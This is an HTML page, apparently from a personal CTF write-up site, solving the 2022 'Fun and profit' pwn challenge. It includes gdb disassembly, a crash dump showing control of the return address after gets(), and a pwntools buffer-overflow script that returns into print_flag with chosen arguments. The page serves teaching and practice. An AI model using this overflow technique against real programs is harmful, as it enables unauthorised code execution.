@@ -1,0 +1,305 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\Gymnasie-mesterskaberne 2022">Gymnasie-mesterskaberne 2022</a>
+            <a href="/CTF-writeups\Gymnasie-mesterskaberne 2022\Fun and profit/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>Fun and profit</span>
+            <span class="text-right">[None]</span>
+        </h1>
+        <hr>
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <p><code>*CHALL TEXT*</code></p>
+<h2>Reverse engineering</h2>
+<p>For this challenge, we are given only a binary, with no source code. The challenge text gives us direct instructions for the arguments to call <code>print_flag</code>. Downloading the file to our local machine, we can begin to reverse it.</p>
+<p>Jumping to the main function, we see a welcome message and a call to the <code>fun_or_profit</code> function. Let's disassemble the function:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ disas fun_or_profit
+Dump of assembler code for function fun_or_profit:
+   0x080498ca &lt;+0&gt;:     push   ebp
+   0x080498cb &lt;+1&gt;:     mov    ebp,esp
+   0x080498cd &lt;+3&gt;:     push   ebx
+   0x080498ce &lt;+4&gt;:     sub    esp,0x158
+   0x080498d4 &lt;+10&gt;:    call   0x80496a0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x080498d9 &lt;+15&gt;:    add    ebx,0xbd71b
+   0x080498df &lt;+21&gt;:    mov    eax,0x8107430
+   0x080498e5 &lt;+27&gt;:    mov    eax,DWORD PTR [eax]
+   0x080498e7 &lt;+29&gt;:    push   eax
+   0x080498e8 &lt;+30&gt;:    push   0x47
+   0x080498ea &lt;+32&gt;:    push   0x1
+   0x080498ec &lt;+34&gt;:    lea    eax,[ebx-0x36f40]
+   0x080498f2 &lt;+40&gt;:    push   eax
+   0x080498f3 &lt;+41&gt;:    call   0x805e420 &lt;fwrite&gt;
+   0x080498f8 &lt;+46&gt;:    add    esp,0x10
+   0x080498fb &lt;+49&gt;:    lea    eax,[ebp-0x15a]
+   0x08049901 &lt;+55&gt;:    push   eax
+   0x08049902 &lt;+56&gt;:    call   0x805e590 &lt;gets&gt;
+   0x08049907 &lt;+61&gt;:    add    esp,0x4
+   0x0804990a &lt;+64&gt;:    lea    eax,[ebx-0x36ef8]
+   0x08049910 &lt;+70&gt;:    push   eax
+   0x08049911 &lt;+71&gt;:    lea    eax,[ebp-0x15a]
+   0x08049917 &lt;+77&gt;:    push   eax
+   0x08049918 &lt;+78&gt;:    call   0x8049058
+   0x0804991d &lt;+83&gt;:    add    esp,0x8
+   0x08049920 &lt;+86&gt;:    test   eax,eax
+   0x08049922 &lt;+88&gt;:    jne    0x8049935 &lt;fun_or_profit+107&gt;
+   0x08049924 &lt;+90&gt;:    lea    eax,[ebx-0x36ef4]
+   0x0804992a &lt;+96&gt;:    push   eax
+   0x0804992b &lt;+97&gt;:    call   0x805e830 &lt;puts&gt;
+   0x08049930 &lt;+102&gt;:   add    esp,0x4
+   0x08049933 &lt;+105&gt;:   jmp    0x804999b &lt;fun_or_profit+209&gt;
+   0x08049935 &lt;+107&gt;:   lea    eax,[ebx-0x36ec1]
+   0x0804993b &lt;+113&gt;:   push   eax
+   0x0804993c &lt;+114&gt;:   lea    eax,[ebp-0x15a]
+   0x08049942 &lt;+120&gt;:   push   eax
+   0x08049943 &lt;+121&gt;:   call   0x8049058
+   0x08049948 &lt;+126&gt;:   add    esp,0x8
+   0x0804994b &lt;+129&gt;:   test   eax,eax
+   0x0804994d &lt;+131&gt;:   jne    0x8049960 &lt;fun_or_profit+150&gt;
+   0x0804994f &lt;+133&gt;:   lea    eax,[ebx-0x36eb8]
+   0x08049955 &lt;+139&gt;:   push   eax
+   0x08049956 &lt;+140&gt;:   call   0x805e830 &lt;puts&gt;
+   0x0804995b &lt;+145&gt;:   add    esp,0x4
+   0x0804995e &lt;+148&gt;:   jmp    0x804999b &lt;fun_or_profit+209&gt;
+   0x08049960 &lt;+150&gt;:   lea    eax,[ebx-0x36e84]
+   0x08049966 &lt;+156&gt;:   push   eax
+   0x08049967 &lt;+157&gt;:   lea    eax,[ebp-0x15a]
+   0x0804996d &lt;+163&gt;:   push   eax
+   0x0804996e &lt;+164&gt;:   call   0x8049058
+   0x08049973 &lt;+169&gt;:   add    esp,0x8
+   0x08049976 &lt;+172&gt;:   test   eax,eax
+   0x08049978 &lt;+174&gt;:   jne    0x804998b &lt;fun_or_profit+193&gt;
+   0x0804997a &lt;+176&gt;:   lea    eax,[ebx-0x36e7c]
+   0x08049980 &lt;+182&gt;:   push   eax
+   0x08049981 &lt;+183&gt;:   call   0x805e830 &lt;puts&gt;
+   0x08049986 &lt;+188&gt;:   add    esp,0x4
+   0x08049989 &lt;+191&gt;:   jmp    0x804999b &lt;fun_or_profit+209&gt;
+   0x0804998b &lt;+193&gt;:   lea    eax,[ebx-0x36e56]
+   0x08049991 &lt;+199&gt;:   push   eax
+   0x08049992 &lt;+200&gt;:   call   0x805e830 &lt;puts&gt;
+   0x08049997 &lt;+205&gt;:   add    esp,0x4
+   0x0804999a &lt;+208&gt;:   nop
+   0x0804999b &lt;+209&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x0804999e &lt;+212&gt;:   leave  
+   0x0804999f &lt;+213&gt;:   ret    
+End of assembler dump.
+</code></pre></div>
+
+<p>Assuming we have an overflow on the initial <code>gets</code> call, we should be able to control the return, leading us to the <code>print_flag</code> function. Lets do a test:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ pattern create 400 test.txt
+Writing pattern of 400 chars to filename &quot;test.txt&quot;
+gdb-peda$ r &lt; test.txt
+Starting program: /home/kali/Desktop/binary &lt; test.txt
+Greetings, traveller. Welcome to my SSH server.
+
+Now, tell me: are you looking for fun or are you looking for profit?
+&gt; 
+I don&#39;t know what that is.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x1c 
+EBX: 0x5225416d (&#39;mA%R&#39;)
+ECX: 0x8108a70 --&gt; 0x0 
+EDX: 0x1 
+ESI: 0x8106ff4 --&gt; 0x0 
+EDI: 0x1 
+EBP: 0x416f2541 (&#39;A%oA&#39;)
+ESP: 0xffffd0a4 (&quot;pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+EIP: 0x25415325 (&#39;%SA%&#39;)
+EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x25415325
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd0a4 (&quot;pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0004| 0xffffd0a8 (&quot;A%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0008| 0xffffd0ac (&quot;%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0012| 0xffffd0b0 (&quot;rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0016| 0xffffd0b4 (&quot;A%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0020| 0xffffd0b8 (&quot;%WA%uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0024| 0xffffd0bc (&quot;uA%XA%vA%YA%wA%ZA%xA%y&quot;)
+0028| 0xffffd0c0 (&quot;A%vA%YA%wA%ZA%xA%y&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x25415325 in ?? ()
+</code></pre></div>
+
+<p>Indeed, we can control the return register. We get an offset of 354. </p>
+<hr />
+<h2>Calling conventions</h2>
+<p>To pass the correct arguments to the function, let's first disassemble the <code>print_flag</code> function:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ disas print_flag
+Dump of assembler code for function print_flag:
+   0x080497c5 &lt;+0&gt;:     push   ebp
+   0x080497c6 &lt;+1&gt;:     mov    ebp,esp
+   0x080497c8 &lt;+3&gt;:     push   ebx
+   0x080497c9 &lt;+4&gt;:     sub    esp,0x70
+   0x080497cc &lt;+7&gt;:     call   0x80496a0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x080497d1 &lt;+12&gt;:    add    ebx,0xbd823
+   0x080497d7 &lt;+18&gt;:    mov    edx,DWORD PTR [ebp+0xc]
+   0x080497da &lt;+21&gt;:    mov    eax,DWORD PTR [ebp+0x10]
+   0x080497dd &lt;+24&gt;:    mov    BYTE PTR [ebp-0x70],dl
+   0x080497e0 &lt;+27&gt;:    mov    BYTE PTR [ebp-0x74],al
+   0x080497e3 &lt;+30&gt;:    lea    eax,[ebx-0x36fec]
+   0x080497e9 &lt;+36&gt;:    push   eax
+   0x080497ea &lt;+37&gt;:    lea    eax,[ebx-0x36fea]
+   0x080497f0 &lt;+43&gt;:    push   eax
+   0x080497f1 &lt;+44&gt;:    call   0x805e400 &lt;fopen&gt;
+   0x080497f6 &lt;+49&gt;:    add    esp,0x8
+   0x080497f9 &lt;+52&gt;:    mov    DWORD PTR [ebp-0x8],eax
+   0x080497fc &lt;+55&gt;:    cmp    DWORD PTR [ebp+0x8],0x15b
+   0x08049803 &lt;+62&gt;:    je     0x8049829 &lt;print_flag+100&gt;
+   0x08049805 &lt;+64&gt;:    push   DWORD PTR [ebp+0x8]
+   0x08049808 &lt;+67&gt;:    lea    eax,[ebx-0x36fd8]
+   0x0804980e &lt;+73&gt;:    push   eax
+   0x0804980f &lt;+74&gt;:    call   0x8051b40 &lt;printf&gt;
+   0x08049814 &lt;+79&gt;:    add    esp,0x8
+   0x08049817 &lt;+82&gt;:    push   DWORD PTR [ebp-0x8]
+   0x0804981a &lt;+85&gt;:    call   0x805df80 &lt;fclose&gt;
+   0x0804981f &lt;+90&gt;:    add    esp,0x4
+   0x08049822 &lt;+93&gt;:    push   0x1
+   0x08049824 &lt;+95&gt;:    call   0x80510a0 &lt;exit&gt;
+   0x08049829 &lt;+100&gt;:   movzx  eax,BYTE PTR [ebp-0x70]
+   0x0804982d &lt;+104&gt;:   xor    eax,0x1
+   0x08049830 &lt;+107&gt;:   test   al,al
+   0x08049832 &lt;+109&gt;:   je     0x804986a &lt;print_flag+165&gt;
+   0x08049834 &lt;+111&gt;:   cmp    BYTE PTR [ebp-0x70],0x0
+   0x08049838 &lt;+115&gt;:   je     0x8049842 &lt;print_flag+125&gt;
+   0x0804983a &lt;+117&gt;:   lea    eax,[ebx-0x36fac]
+   0x08049840 &lt;+123&gt;:   jmp    0x8049848 &lt;print_flag+131&gt;
+   0x08049842 &lt;+125&gt;:   lea    eax,[ebx-0x36fa7]
+   0x08049848 &lt;+131&gt;:   push   eax
+   0x08049849 &lt;+132&gt;:   lea    eax,[ebx-0x36fa0]
+   0x0804984f &lt;+138&gt;:   push   eax
+   0x08049850 &lt;+139&gt;:   call   0x8051b40 &lt;printf&gt;
+   0x08049855 &lt;+144&gt;:   add    esp,0x8
+   0x08049858 &lt;+147&gt;:   push   DWORD PTR [ebp-0x8]
+   0x0804985b &lt;+150&gt;:   call   0x805df80 &lt;fclose&gt;
+   0x08049860 &lt;+155&gt;:   add    esp,0x4
+   0x08049863 &lt;+158&gt;:   push   0x1
+   0x08049865 &lt;+160&gt;:   call   0x80510a0 &lt;exit&gt;
+   0x0804986a &lt;+165&gt;:   cmp    BYTE PTR [ebp-0x74],0x57
+   0x0804986e &lt;+169&gt;:   je     0x8049896 &lt;print_flag+209&gt;
+   0x08049870 &lt;+171&gt;:   movsx  eax,BYTE PTR [ebp-0x74]
+   0x08049874 &lt;+175&gt;:   push   eax
+   0x08049875 &lt;+176&gt;:   lea    eax,[ebx-0x36f70]
+   0x0804987b &lt;+182&gt;:   push   eax
+   0x0804987c &lt;+183&gt;:   call   0x8051b40 &lt;printf&gt;
+   0x08049881 &lt;+188&gt;:   add    esp,0x8
+   0x08049884 &lt;+191&gt;:   push   DWORD PTR [ebp-0x8]
+   0x08049887 &lt;+194&gt;:   call   0x805df80 &lt;fclose&gt;
+   0x0804988c &lt;+199&gt;:   add    esp,0x4
+   0x0804988f &lt;+202&gt;:   push   0x1
+   0x08049891 &lt;+204&gt;:   call   0x80510a0 &lt;exit&gt;
+   0x08049896 &lt;+209&gt;:   lea    eax,[ebp-0x6c]
+   0x08049899 &lt;+212&gt;:   push   eax
+   0x0804989a &lt;+213&gt;:   lea    eax,[ebx-0x36f43]
+   0x080498a0 &lt;+219&gt;:   push   eax
+   0x080498a1 &lt;+220&gt;:   push   DWORD PTR [ebp-0x8]
+   0x080498a4 &lt;+223&gt;:   call   0x8051b90 &lt;__isoc99_fscanf&gt;
+   0x080498a9 &lt;+228&gt;:   add    esp,0xc
+   0x080498ac &lt;+231&gt;:   lea    eax,[ebp-0x6c]
+   0x080498af &lt;+234&gt;:   push   eax
+   0x080498b0 &lt;+235&gt;:   call   0x805e830 &lt;puts&gt;
+   0x080498b5 &lt;+240&gt;:   add    esp,0x4
+   0x080498b8 &lt;+243&gt;:   push   DWORD PTR [ebp-0x8]
+   0x080498bb &lt;+246&gt;:   call   0x805df80 &lt;fclose&gt;
+   0x080498c0 &lt;+251&gt;:   add    esp,0x4
+   0x080498c3 &lt;+254&gt;:   push   0x0
+   0x080498c5 &lt;+256&gt;:   call   0x80510a0 &lt;exit&gt;
+End of assembler dump.
+</code></pre></div>
+
+<p>As we can see, the flag is loaded <em>before</em> the arguments are checked, so just jumping to the print won't work. Further, the arguments seem to be loaded from the stack, one after another. This makes the final exploit very simple, as we must simply place the arguments consecutively, and we're good to go. With a bit of experimentation, we can see that the arguments must be offset with 4 bytes from the return address. I'll be making the solution in python.</p>
+<hr />
+<h2>Solution</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./binary&quot;</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./binary&quot;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">350</span> <span class="c1"># Offset for return pointer</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080497c5</span><span class="p">)</span> <span class="c1"># Address for print_flag function</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span> <span class="c1"># Filler before arguments</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">347</span><span class="p">)</span> <span class="c1"># arg1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># arg2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">87</span><span class="p">)</span> <span class="c1"># arg3</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;}&quot;</span><span class="p">))</span>
+</code></pre></div>
+
+<p>This works locally. As the server doesn't have python installed, we can just write the payload to a file, and upload it:</p>
+<div class="codehilite"><pre><span></span><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;fun_or_profit.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;w+b&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<p>This gives us our flag.</p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
